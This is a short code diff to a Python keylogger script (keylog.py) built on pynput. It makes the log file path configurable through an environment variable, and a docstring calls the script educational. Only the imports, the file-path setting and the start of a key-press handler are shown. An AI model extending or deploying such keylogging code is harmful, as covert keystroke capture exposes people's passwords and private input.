@@ -4,9 +4,11 @@ keylog.py - Basic keylogger implementation in Python.
 For educational purposes only. Ensure compliance with local laws before use.
 """
 
+import os
+
 from pynput import keyboard
 
-LOG_FILE = "keylog.txt"
+LOG_FILE = os.getenv("KEYLOG_FILE", "keylog.txt")
 
 
 def on_press(key: keyboard.Key | keyboard.KeyCode) -> None:
